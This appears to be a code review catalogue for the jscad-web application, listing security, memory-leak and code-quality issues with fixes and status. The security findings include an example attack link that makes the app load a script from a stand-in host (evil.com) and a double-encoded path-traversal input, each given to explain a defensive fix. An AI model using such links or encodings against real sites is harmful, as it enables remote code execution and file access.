# Code Review Issues and Remediation Plan

This document catalogs issues found during deep code review of `apps/jscad-web` and its local package dependencies. Issues are organized by severity with proposed fixes.

---

## Critical Issues

### C1. Remote Code Execution via URL Fragment
**Location:** `apps/jscad-web/src/remote.js:48-59`
**Severity:** CRITICAL
**Type:** Security
**Status:** Open

**Problem:**
```javascript
const url = window.location.hash.substring(1)
if (url) {
  const script = await fetchUrl(url)
  compileFn(script, url)  // Executes arbitrary code
}
```
Any public URL in the hash fragment is fetched and executed as JavaScript. An attacker can craft a link like `https://jscad.app/#https://evil.com/malicious.js` and share it.

**Proposed Fix:**
Add a Content Security Policy and/or domain allowlist for remote scripts. The application's intended function is to load JSCAD scripts from trusted sources (user's own files, examples, trusted CDNs).

**Why this doesn't break functionality:**
- Users loading local files: Unaffected (uses File System API, not URL hash)
- Users loading from hash: Can still load from allowlisted domains (github gists, specific CDNs)
- The `isValidRemoteUrl` function already exists in `serve.js` - extend this pattern

**Implementation:**
```javascript
const ALLOWED_REMOTE_DOMAINS = [
  'gist.githubusercontent.com',
  'raw.githubusercontent.com',
  'cdn.jsdelivr.net',
  // User can configure additional domains
]

const isAllowedRemoteUrl = (urlString) => {
  try {
    const url = new URL(urlString)
    return ALLOWED_REMOTE_DOMAINS.some(domain => url.hostname.endsWith(domain))
  } catch { return false }
}
```

---

### C2. eval-based Module Execution
**Location:** `packages/require/src/require.js:24`
**Severity:** CRITICAL (by design)
**Type:** Security
**Status:** Won't Fix (by design)

**Problem:**
```javascript
export const runModule = globalThis.eval('(require, exports, module, source)=>eval(source)')
```

**Assessment:**
This is **inherent to the application's design** - JSCAD is a code execution environment. Users write JavaScript that gets executed. This is the same trust model as CodePen, JSFiddle, or the browser console.

**Proposed Fix:**
Document the security model rather than "fix" it. Add warnings in UI when loading remote scripts.

**Why this doesn't break functionality:**
The application IS a code editor/executor. Removing eval would break the core purpose.

**Mitigation:**
1. Run in Web Worker (already done) - provides isolation from main thread
2. Add CSP headers to prevent exfiltration
3. Display clear warning when loading untrusted remote scripts
4. Consider iframe sandbox for additional isolation (future enhancement)

---

### C3. Manifold WASM Memory Leak
**Location:** `packages/manifold/src/booleans/index.js`, `transforms/index.js`, etc.
**Severity:** CRITICAL
**Type:** Memory Management
**Status:** Open

**Problem:**
```javascript
// booleans/index.js:118-124
const manifolds = geoms.map(g => toManifold(g))
let result = manifolds[0]
for (let i = 1; i < manifolds.length; i++) {
  result = result.subtract(manifolds[i])  // Old result orphaned, never disposed
}
```
Manifold WASM objects allocate on the WASM heap. Without explicit disposal, memory grows unbounded.

**Proposed Fix:**
Implement disposal tracking using FinalizationRegistry for automatic cleanup, plus explicit `dispose()` method for manual control.

**Why this doesn't break functionality:**
- Scripts produce final geometry which is converted to mesh for rendering
- Intermediate Manifold objects are only needed during computation
- Disposing after conversion preserves all output

**Implementation:**
```javascript
// In ManifoldGeom3.js
const disposalRegistry = new FinalizationRegistry(manifoldRef => {
  manifoldRef.delete?.()  // Manifold's cleanup method
})

class ManifoldGeom3 {
  #manifold
  constructor(manifold) {
    this.#manifold = manifold
    disposalRegistry.register(this, manifold)
  }

  dispose() {
    this.#manifold?.delete?.()
    this.#manifold = null
  }
}
```

---

### C4. Double-Encoding Path Traversal Bypass
**Location:** `packages/require/src/resolveUrl.js:17-33`
**Severity:** CRITICAL
**Type:** Security
**Status:** Open

**Problem:**
```javascript
const normalizePath = (path) => {
  const decoded = decodeURIComponent(path)  // Single decode
  // ...check for '..'
}
```
Attack: `%252e%252e` → decodes to `%2e%2e` → NOT caught as `..`

**Proposed Fix:**
Decode recursively until stable, or use allowlist approach.

**Why this doesn't break functionality:**
- Normal paths don't contain encoded characters
- Legitimate double-encoded paths are extremely rare
- The check prevents malicious traversal without affecting normal operation

**Implementation:**
```javascript
const fullyDecode = (path) => {
  let decoded = path
  let prev
  do {
    prev = decoded
    try { decoded = decodeURIComponent(decoded) } catch { break }
  } while (decoded !== prev)
  return decoded
}

const normalizePath = (path) => {
  const decoded = fullyDecode(path)
  // ...rest of function
}
```

---

## High Severity Issues

### H1. Animation Loop Missing Error Handling
**Location:** `apps/jscad-web/src/animRunner.js:43-73`
**Type:** Error Handling
**Effort:** Easy
**Status:** FIXED

**Problem:** No try/catch in animation while loop. If worker throws, animation never calls `handleEnd()`.

**Fix:** Added try/catch around animation loop, also removed unused `_startTime` and `_i` variables.

---

### H2. Service Worker Registration Error Swallowed
**Location:** `packages/fs-provider/fs-provider.js:161-175`
**Type:** Error Handling
**Effort:** Easy
**Status:** FIXED

**Problem:** Catch block only logs, execution continues with broken state.

**Fix:** Re-throw error after logging.

---

### H3. clearFs Not Awaited in fileDropped
**Location:** `packages/fs-provider/fs-provider.js:375`
**Type:** Race Condition
**Effort:** Easy
**Status:** FIXED

**Problem:** `clearFs(sw)` is async but not awaited.

**Fix:** Added `await`.

---

### H4. Document Event Listeners Never Removed (Color Input)
**Location:** `packages/params-ui/src/inputs.js:342-356`
**Type:** Memory Leak
**Effort:** Medium
**Status:** Open

**Problem:** Document-level click/keydown listeners added but cleanup requires manual call.

**Fix:** Document requirement clearly, add AbortController pattern for easier cleanup.

---

### H5. Document Event Listeners Never Removed (Class Input)
**Location:** `packages/params-ui/src/ParamsTree.js:474-487`
**Type:** Memory Leak
**Effort:** Medium
**Status:** Open

**Problem:** Same as H4.

---

### H6. Module Cache Grows Unbounded
**Location:** `packages/require/src/require.js:245-251`
**Type:** Memory Management
**Effort:** Medium
**Status:** Open

**Problem:** `requireCache.module` never cleared by `jscadClearTempCache()`.

**Fix:** Add LRU eviction or periodic cleanup.

---

### H7. Circular Dependency Causes Stack Overflow
**Location:** `packages/require/src/require.js`
**Type:** Error Handling
**Effort:** Medium
**Status:** Open

**Problem:** No detection of A→B→A circular requires.

**Fix:** Track "loading" state in addition to "loaded".

---

### H8. ManifoldGeom3.clone() Shares Reference
**Location:** `packages/manifold/src/geometries/ManifoldGeom3.js:295-299`
**Type:** Logic Error
**Effort:** Medium
**Status:** Open

**Problem:** Clone reuses same Manifold object.

**Fix:** Use Manifold's copy/clone method if available, or convert to mesh and back.

---

### H9. Script Lock Has No Timeout
**Location:** `packages/worker/worker.js:62-78`
**Type:** Robustness
**Effort:** Medium
**Status:** Open

**Problem:** Infinite loop in user script blocks all subsequent loads forever.

**Fix:** Add configurable timeout to `acquireScriptLock()`.

---

### H10. Worker Package Has No Tests
**Location:** `packages/worker/`
**Type:** Quality
**Effort:** High
**Status:** Open

**Problem:** Complex script loading logic with zero test coverage.

**Fix:** Add comprehensive test suite.

---

## Medium Severity Issues

### M1. Redundant Handler Assignment
**Location:** `apps/jscad-web/main.js:146-154`
**Effort:** Easy
**Status:** FIXED

**Problem:** `handleEntities` passed to createWorker then immediately overwritten.

**Fix:** Removed redundant assignment.

---

### M2. setError Called Twice Unconditionally
**Location:** `apps/jscad-web/main.js:538-546`
**Effort:** Easy
**Status:** FIXED

**Problem:** `setError` at line 541 is overwritten by line 546.

**Fix:** Restructured logic to call setError only once per code path.

---

### M3. Unused Variable in animRunner.js
**Location:** `apps/jscad-web/src/animRunner.js:37-39`
**Effort:** Easy
**Status:** FIXED

**Problem:** `_startTime` and `_i` assigned but never used.

**Fix:** Removed unused variables (fixed as part of H1).

---

### M4. JSON.parse Without Try/Catch (viewState)
**Location:** `apps/jscad-web/src/viewState.js:67-75`
**Effort:** Easy
**Status:** FIXED

**Problem:** localStorage JSON parse can throw on corrupted data.

**Fix:** Wrapped in try/catch with fallback to default camera.

---

### M5. Loose Equality Comparison
**Location:** `apps/jscad-web/main.js:230`
**Effort:** Easy
**Status:** FIXED

**Problem:** `source == 'group'` uses loose equality.

**Fix:** Changed to `===`.

---

### M6. var Usage in str2ab.js
**Location:** `apps/jscad-web/src/str2ab.js:6-10`
**Effort:** Easy
**Status:** FIXED

**Problem:** Uses `var` instead of `let/const`.

**Fix:** Updated to modern syntax (`const`/`let`).

---

### M7. Inconsistent Optional Chaining
**Location:** `apps/jscad-web/src/welcome.js:53-54`
**Effort:** Easy
**Status:** FIXED

**Problem:** Uses `e?.target?.nodeName` then `e.target` without chaining.

**Fix:** Added optional chaining: `e?.target`.

---

### M8. Magic Numbers in drawer.js
**Location:** `apps/jscad-web/src/drawer.js:55, 67`
**Effort:** Easy
**Status:** FIXED

**Problem:** Magic numbers 5 and 200.

**Fix:** Extracted to named constants `DRAG_THRESHOLD_PX` and `LONG_PRESS_MS`.

---

### M9. HTTP Status 0 Not Handled
**Location:** `packages/require/src/readFileWeb.js:15-18`
**Effort:** Easy
**Status:** FIXED

**Problem:** Status 0 (network error) passes through silently.

**Fix:** Added explicit check for status 0 with descriptive error message.

---

### M10. Console.log in Production
**Location:** `packages/require/src/readFileNode.js:16`
**Effort:** Easy
**Status:** FIXED

**Problem:** Debug logging left in.

**Fix:** Removed console.log.

---

### M11. Unused _output Parameter
**Location:** `packages/require/src/readFileNode.js:11`
**Effort:** Easy
**Status:** FIXED

**Problem:** Parameter destructured but never used.

**Fix:** Removed unused parameter.

---

### M12. Empty Catch in Safari Polyfill
**Location:** `packages/fs-provider/src/safariFileHandles.js:25-29`
**Effort:** Easy
**Status:** FIXED

**Problem:** Errors silently swallowed.

**Fix:** Added console.warn with entry name and error details.

---

### M13. String Rejection in FileReader
**Location:** `packages/fs-provider/src/FileReader.js:45-49`
**Effort:** Easy
**Status:** FIXED

**Problem:** Rejects with string instead of Error object.

**Fix:** Changed to `reject(new Error(msg))`.

---

### M14. libRoots Never Used
**Location:** `packages/fs-provider/fs-provider.js:25`
**Effort:** Easy
**Status:** Open (low priority)

**Problem:** TODO comment says to remove.

**Fix:** Remove if truly unused. Kept for now as it's vestigial but harmless.

---

### M15. Silent Conversion Failures in Manifold
**Location:** `packages/manifold/src/conversions/index.js:328-375`
**Effort:** Medium
**Status:** Open

**Problem:** Errors caught and return empty geometry silently.

**Fix:** Log warning or throw.

---

### M16. center/align Unnecessary Conversions
**Location:** `packages/manifold/src/transforms/index.js:359-387, 420-447`
**Effort:** Medium
**Status:** Open

**Problem:** Converts Manifold→JSCAD→Manifold instead of using Manifold bbox.

**Fix:** Implement natively using Manifold's bounding box.

---

### M17. O(n) linkedPaths.includes in Loop
**Location:** `apps/jscad-web/src/paramsUI.js:200-210`
**Effort:** Easy
**Status:** FIXED

**Problem:** O(n*m) complexity for linked param updates.

**Fix:** Changed to use Set for O(1) lookups.

---

### M18. JSON.stringify for Deep Comparison
**Location:** `apps/jscad-web/src/paramsUI.js:163-166`
**Effort:** Medium
**Status:** Open

**Problem:** Expensive comparison on every model update.

**Fix:** Use targeted comparison or hash.

---

### M19. Full Tree Re-render on Toggle
**Location:** `packages/params-ui/src/ParamsTree.js:136-144`
**Effort:** Medium
**Status:** Open

**Problem:** Expand/collapse re-renders entire tree.

**Fix:** Implement incremental updates.

---

### M20. Linear Search in Discovered Array
**Location:** `packages/params-core/src/createParamsProxy.js:309`
**Effort:** Medium (requires data structure refactor)
**Status:** Open

**Problem:** `discovered.find()` is O(n) on every param set.

**Fix:** Use Map keyed by path for O(1) lookup.

---

## Low Severity Issues

### L1. Duplicate Reload Detection Logic
**Location:** `main.js` and `fileSystem.js`
**Effort:** Easy
**Status:** Open

Extract to shared utility.

### L2. destroy() Functions Never Called
**Location:** `apps/jscad-web/main.js`
**Effort:** Medium
**Status:** Open

Integrate cleanup on navigation/unload.

### L3. Error Object Type Access Without Guards
**Location:** `apps/jscad-web/src/error.js:8-17`
**Effort:** Easy
**Status:** FIXED

**Fix:** Added type guards for error.name and error.message to handle non-Error objects.

### L4. Inconsistent Event Handler Attachment
**Location:** `packages/params-ui/src/ParamsTree.js`
**Effort:** Low priority
**Status:** Open

Standardize on addEventListener pattern.

### L5. Missing .d.ts Type Definitions
**Location:** All packages
**Effort:** High
**Status:** Open

Add TypeScript declaration files for consumers.

---

## Summary

### Fixed Issues (17 total)
- **High:** H1, H2, H3
- **Medium:** M1, M2, M3, M4, M5, M6, M7, M8, M9, M10, M11, M12, M13, M17
- **Low:** L3

### Remaining Easy Fixes
- M14 (libRoots removal - low priority)
- L1 (duplicate reload logic)

### Medium Effort (Open)
- H4, H5, H6, H7, H8, H9
- M15, M16, M18, M19, M20
- L2

### High Effort (Open)
- C1, C3, C4
- H10
- L5

---

## Implementation Priority

1. ~~**Phase 1 (Easy wins):** Fix all easy issues - improves code quality immediately~~ **DONE**
2. **Phase 2 (Security):** C1, C4 - critical security hardening
3. **Phase 3 (Memory):** C3, H6 - prevent memory issues in long sessions
4. **Phase 4 (Robustness):** H7, H9 - handle edge cases gracefully
5. **Phase 5 (Testing):** H10 - add test coverage to worker package
